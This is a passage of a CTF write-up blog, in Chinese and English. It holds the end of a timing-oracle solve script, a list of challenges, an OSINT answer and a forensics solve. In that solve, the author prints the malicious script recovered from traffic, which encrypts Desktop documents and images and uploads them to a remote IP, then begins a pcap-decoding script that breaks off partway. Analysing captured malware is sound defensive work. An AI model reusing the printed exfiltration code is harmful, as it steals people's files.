</span></span><span class=line><span class=cl>        <span class=c1># P3 = (x &gt;= M1)</span>
</span></span><span class=line><span class=cl>        <span class=n>p3</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;op&#39;</span><span class=p>:</span> <span class=s1>&#39;&gt;=&#39;</span><span class=p>,</span> <span class=s1>&#39;arg1&#39;</span><span class=p>:</span> <span class=s1>&#39;x&#39;</span><span class=p>,</span> <span class=s1>&#39;arg2&#39;</span><span class=p>:</span> <span class=n>M1</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># Right Side = P3 and DelayFalse</span>
</span></span><span class=line><span class=cl>        <span class=n>right_side</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;op&#39;</span><span class=p>:</span> <span class=s1>&#39;and&#39;</span><span class=p>,</span> <span class=s1>&#39;arg1&#39;</span><span class=p>:</span> <span class=n>p3</span><span class=p>,</span> <span class=s1>&#39;arg2&#39;</span><span class=p>:</span> <span class=n>delay_false_expr</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># Full Query = Left Side or Right Side</span>
</span></span><span class=line><span class=cl>        <span class=n>query</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;op&#39;</span><span class=p>:</span> <span class=s1>&#39;or&#39;</span><span class=p>,</span> <span class=s1>&#39;arg1&#39;</span><span class=p>:</span> <span class=n>left_side</span><span class=p>,</span> <span class=s1>&#39;arg2&#39;</span><span class=p>:</span> <span class=n>right_side</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># Send and measure</span>
</span></span><span class=line><span class=cl>        <span class=c1># Wait for prompt to ensure clean timing</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>readuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>start</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>query</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>end</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>duration</span> <span class=o>=</span> <span class=n>end</span> <span class=o>-</span> <span class=n>start</span>
</span></span><span class=line><span class=cl>        <span class=n>is_slow</span> <span class=o>=</span> <span class=n>duration</span> <span class=o>&gt;</span> <span class=n>TIME_THRESHOLD</span>
</span></span><span class=line><span class=cl>        <span class=n>is_yes</span> <span class=o>=</span> <span class=p>(</span><span class=n>res</span> <span class=o>==</span> <span class=s2>&#34;Yes!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>pwn</span><span class=o>.</span><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Time=</span><span class=si>{</span><span class=n>duration</span><span class=si>:</span><span class=s2>.4f</span><span class=si>}</span><span class=s2>s (Slow=</span><span class=si>{</span><span class=n>is_slow</span><span class=si>}</span><span class=s2>), Response=</span><span class=si>{</span><span class=n>res</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># Determine Interval</span>
</span></span><span class=line><span class=cl>        <span class=c1># False, Fast -&gt; Q0: [L, M1)</span>
</span></span><span class=line><span class=cl>        <span class=c1># False, Slow -&gt; Q1: [M1, M2)</span>
</span></span><span class=line><span class=cl>        <span class=c1># True, Fast  -&gt; Q2: [M2, M3)</span>
</span></span><span class=line><span class=cl>        <span class=c1># True, Slow  -&gt; Q3: [M3, R)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>is_yes</span> <span class=ow>and</span> <span class=ow>not</span> <span class=n>is_slow</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># Q0</span>
</span></span><span class=line><span class=cl>            <span class=n>R</span> <span class=o>=</span> <span class=n>M1</span>
</span></span><span class=line><span class=cl>            <span class=n>pwn</span><span class=o>.</span><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Inferred: Q0 (False, Fast)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=ow>not</span> <span class=n>is_yes</span> <span class=ow>and</span> <span class=n>is_slow</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># Q1</span>
</span></span><span class=line><span class=cl>            <span class=n>L</span> <span class=o>=</span> <span class=n>M1</span>
</span></span><span class=line><span class=cl>            <span class=n>R</span> <span class=o>=</span> <span class=n>M2</span>
</span></span><span class=line><span class=cl>            <span class=n>pwn</span><span class=o>.</span><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Inferred: Q1 (False, Slow)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>is_yes</span> <span class=ow>and</span> <span class=ow>not</span> <span class=n>is_slow</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># Q2</span>
</span></span><span class=line><span class=cl>            <span class=n>L</span> <span class=o>=</span> <span class=n>M2</span>
</span></span><span class=line><span class=cl>            <span class=n>R</span> <span class=o>=</span> <span class=n>M3</span>
</span></span><span class=line><span class=cl>            <span class=n>pwn</span><span class=o>.</span><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Inferred: Q2 (True, Fast)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>is_yes</span> <span class=ow>and</span> <span class=n>is_slow</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># Q3</span>
</span></span><span class=line><span class=cl>            <span class=n>L</span> <span class=o>=</span> <span class=n>M3</span>
</span></span><span class=line><span class=cl>            <span class=n>pwn</span><span class=o>.</span><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Inferred: Q3 (True, Slow)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>    <span class=c1># Final guess</span>
</span></span><span class=line><span class=cl>    <span class=n>pwn</span><span class=o>.</span><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Final Range: [</span><span class=si>{</span><span class=n>L</span><span class=si>}</span><span class=s2>, </span><span class=si>{</span><span class=n>R</span><span class=si>}</span><span class=s2>)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>guess</span> <span class=o>=</span> <span class=n>L</span>
</span></span><span class=line><span class=cl>    <span class=n>pwn</span><span class=o>.</span><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Guessing: </span><span class=si>{</span><span class=n>guess</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Guess the number: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>guess</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Read flag</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>solve</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20260111233331-ywx6h5h.png alt=image></p><h2 id=lottery--状态runningreproduction>Lottery | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>Han Shangyan quietly gives away all his savings to protect someone he cares about, leaving himself with nothing. Now broke, his only hope is chance itself.</p><p>Can you help Han Shangyan win the lottery?</p><p>​<code>nc 35.245.30.212 5000</code>​</p><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=kk-training-room--状态runningreproduction>K&amp;K Training Room | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>Welcome to the K&amp;K Training Room. Before every match, players must check in through the bot.</p><p>A successful check in grants the K&amp;K role, opening access to team channels and match coordination.</p><p><a href=https://discord.gg/3u6V8uAGm7>https://discord.gg/3u6V8uAGm7</a></p><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=file-upload--状态runningreproduction>File Upload | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>Upload and download files</p><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=vibe-code--状态runningreproduction>Vibe Code | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>AI is so ubiquitous in CTF, so I am forcing you to use it to solve this easy C jail.</p><p>​<code>nc 34.23.133.46 5000</code>​</p><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=nothing-ever-changes--状态runningreproduction>Nothing Ever Changes | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>While conducting her research on artificial intelligence, Tong Nian claims to have found a way to create adversarial examples without changing anything at all. Her colleagues are skeptical. Can you help her hash out the details of her approach and verify its validity?</p><p>Try it out <a href=http://35.245.68.223:5000/health>here</a>!</p><p><strong>WriteUp</strong></p><p>暂无</p><h1 id=osint>OSINT</h1><h2 id=go-go-coaster--状态solvedlive>Go Go Coaster! | 状态:solved｜Live</h2><p><strong>题目描述</strong></p><p>During an episode of Go Go Squid!, Han Shangyan was too scared to go on a roller coaster. What&rsquo;s the English name of this roller coaster? Also, what&rsquo;s its height in whole feet?</p><p>Flag format: uoftctf{Coaster_Name_HEIGHT}</p><p>Example: uoftctf{Yukon_Striker_999}</p><p>Notes:</p><ol><li>Flag is case-insenstive, just remember to replace spaces with underscores and no decimal points</li></ol><p><strong>WriteUp</strong></p><p>《亲爱的，热爱的》（Go Go Squid!）第 12 集去的 <strong>上海欢乐谷</strong>里那台“主角认证的恐怖级跌落式过山车（近 90 度垂直俯冲）”。</p><p>这台过山车在英文资料里的名称就是：</p><ul><li>​<strong>Diving Coaster</strong>（地点：Happy Valley Shanghai / 上海欢乐谷）</li><li>高度：​<strong>65 m</strong>，折合 ​<strong>约 213 英尺</strong>（whole feet 取 213）。</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>uoftctf<span class=o>{</span>Diving_Coaster_213<span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=go-go-cabinet--状态runningreproduction>Go Go Cabinet! | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>I really like Go Go Squid! In fact, I like it so much that I even bought the same model of cabinet that is in the series!</p><p>Can you find:</p><ol><li>The first and last name of the designer of this cabinet?</li><li>The episode and timestamp that this cabinet first appears at all in the series on YouTube?</li></ol><p>Flag format: uoftctf{First_Last_EpisodeNum_MM:SS}</p><p>Example: uoftctf{John_Doe_06_07:27}</p><p>Notes:</p><ol><li>Mind the flag format/example :)</li><li>There is a 1-second fowards leniency in the timestamp (if 1:00 is correct, then 1:01 is correct)</li></ol><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=my-shikishi-is-fake--状态runningreproduction>My Shikishi is Fake! | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>After the whole incident with Pokemon cards, Han Shangyan decided to buy Tong Nian shikishis autographed by famous manga artists instead. He came across this seller with autographs and sketches done by creators of Dragon Ball, Chainsaw Man, and more, all with certificates of authenticity and money-back guarantees! Surely this is too good to be true?</p><p>Turns out that this particular brand of high-quality fakes have been in production for over a decade, spanning multiple platforms, sellers, and authentication company names, though one name is always constant: the appraiser&rsquo;s.</p><p>What you will need to find:</p><ol><li>First and last name of the appraiser in Japanese (how it appears on the certificate).</li><li>Email that is tied to one of the organizations that the certificate is issued by.</li><li>The year that they were reborn and started to expand the scope of their activities.</li><li>PSA did another oopsie authenticating one of these fakes, a shikishi of Draken and Mikey, which a foreigner unfortunately bought and posted. Find its certification number.</li></ol><p>The flag format will be uoftctf{JPNAME_EMAIL_YEAR_CERT}</p><p>Example: uoftctf{山田太郎_example@example.com_9999_AA99999}</p><p>Notes:</p><ol><li>OSINTing the author will not help, though you are free to do so.</li><li>Flag is case-sensitive.</li></ol><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=t1--状态solvedrunningreproduction>T1 | 状态:solved/running｜Reproduction</h2><p><strong>题目描述</strong></p><p>Han Shangyan wanted to buy an autographed Pokemon card for Tong Nian. Unfortunately, he found out that it was fake! He wants to find out more about this forger, but they have deleted the auction! Can you help him put a stop to this 2-year-long scheme?</p><p><a href=https://auctions.yahoo.co.jp/jp/auction/t1101312767>https://auctions.yahoo.co.jp/jp/auction/t1101312767</a></p><p>What you will need to find:</p><ol><li>The link to the forger&rsquo;s Yahoo Japan Auctions profile</li><li>The link to the forger&rsquo;s Mercari profile, where they still sell similar forgeries to this day</li><li>One of the seller&rsquo;s forgeries of the same Pokemon artist as the forgery in the link given was graded and authenticated with PSA (most trustworthy grading service btw)! Find how much yen it sold for originally.</li><li>The first and last name of the Pokemon artist of the first autograph in the PSA submission that the forger submitted that contains the card from (3).</li><li>Finally, the forger copied the card from (3) from a real signing event to make it look real. What Pokemon artist was first to autograph in that event? Get their twitter username.</li></ol><p>The flag format will be uoftctf{URL1_URL2_AMT_FIRSTNAME_LASTNAME_USERNAME}</p><p>Copy the full URLs.</p><p>Example: uoftctf{<a href=https://auctions.yahoo.co.jp/seller/fhrh2HFHdqw229nrr34r89jdg_https://jp.mercari.com/user/profile/999999_99999_John_Doe_example%7D>https://auctions.yahoo.co.jp/seller/fhrh2HFHdqw229nrr34r89jdg_https://jp.mercari.com/user/profile/999999_99999_John_Doe_example}</a></p><p>Notes:</p><ol><li>OSINTing the author will not help you, though you are free to do so.</li><li>Flag is case-insensitive.</li></ol><p><strong>WriteUp</strong></p><p>暂无</p><h1 id=forensics>Forensics</h1><h2 id=baby-exfil--状态solvedlive>Baby Exfil | 状态:solved｜Live</h2><p><strong>题目描述</strong></p><p>Team K&amp;K has identified suspicious network activity on their machine. Fearing that a competing team may be attempting to steal confidential data through underhanded means, they need your help analyzing the network logs to uncover the truth.</p><p><strong>WriteUp</strong></p><p>翻找流量找到了恶意脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=s2>&#34;G0G0Squ1d3Ncrypt10n&#34;</span>
</span></span><span class=line><span class=cl><span class=n>server</span> <span class=o>=</span> <span class=s2>&#34;http://34.134.77.90:8080/upload&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>xor_file</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=nb>ord</span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=n>i</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>key</span><span class=p>)]))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>base_path</span> <span class=o>=</span> <span class=sa>r</span><span class=s2>&#34;C:\Users\squid\Desktop&#34;</span>
</span></span><span class=line><span class=cl><span class=n>extensions</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;.docx&#39;</span><span class=p>,</span> <span class=s1>&#39;.png&#39;</span><span class=p>,</span> <span class=s2>&#34;.jpeg&#34;</span><span class=p>,</span> <span class=s2>&#34;.jpg&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>root</span><span class=p>,</span> <span class=n>dirs</span><span class=p>,</span> <span class=n>files</span> <span class=ow>in</span> <span class=n>os</span><span class=o>.</span><span class=n>walk</span><span class=p>(</span><span class=n>base_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>file</span> <span class=ow>in</span> <span class=n>files</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>any</span><span class=p>(</span><span class=n>file</span><span class=o>.</span><span class=n>endswith</span><span class=p>(</span><span class=n>ext</span><span class=p>)</span> <span class=k>for</span> <span class=n>ext</span> <span class=ow>in</span> <span class=n>extensions</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>filepath</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>root</span><span class=p>,</span> <span class=n>file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>filepath</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>content</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>                <span class=n>encrypted</span> <span class=o>=</span> <span class=n>xor_file</span><span class=p>(</span><span class=n>content</span><span class=p>,</span> <span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>hex_data</span> <span class=o>=</span> <span class=n>encrypted</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>server</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;file&#39;</span><span class=p>:</span> <span class=p>(</span><span class=n>file</span><span class=p>,</span> <span class=n>hex_data</span><span class=p>)})</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Sent: </span><span class=si>{</span><span class=n>file</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>pass</span>
</span></span></code></pre></td></tr></table></div></div><p>从流57开始可以找到几个upload接口的记录</p><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20260111214927-ob671qr.png alt=image></p><p>然后提取逆向即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>scapy.all</span> <span class=k>as</span> <span class=nn>scapy</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>PCAP_FILE</span> <span class=o>=</span> <span class=s1>&#39;/Users/joker/Code/2026Uoftctf/Forensics/final.pcapng&#39;</span>
</span></span><span class=line><span class=cl><span class=n>KEY</span> <span class=o>=</span> <span class=s2>&#34;G0G0Squ1d3Ncrypt10n&#34;</span>
</span></span><span class=line><span class=cl><span class=n>OUTPUT_DIR</span> <span class=o>=</span> <span class=s1>&#39;/Users/joker/Code/2026Uoftctf/Forensics/extracted&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=ow>not</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>OUTPUT_DIR</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>makedirs</span><span class=p>(</span><span class=n>OUTPUT_DIR</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>xor_file</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=nb>ord</span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=n>i</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>key</span><span class=p>)]))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Reading </span><span class=si>{</span><span class=n>PCAP_FILE</span><span class=si>}</span><span class=s2>...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>packets</span> <span class=o>=</span> <span class=n>scapy</span><span class=o>.</span><span class=n>rdpcap</span><span class=p>(</span><span class=n>PCAP_FILE</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Read </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>packets</span><span class=p>)</span><span class=si>}</span><span class=s2> packets.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Error reading pcap: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Target: 34.134.77.90:8080</span>
</span></span><span class=line><span class=cl><span class=n>target_ip</span> <span class=o>=</span> <span class=s2>&#34;34.134.77.90&#34;</span>
</span></span><span class=line><span class=cl><span class=n>target_port</span> <span class=o>=</span> <span class=mi>8080</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Organize packets by TCP stream</span>
</span></span><span class=line><span class=cl><span class=n>streams</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>pkt</span> <span class=ow>in</span> <span class=n>packets</span><span class=p>:</span>
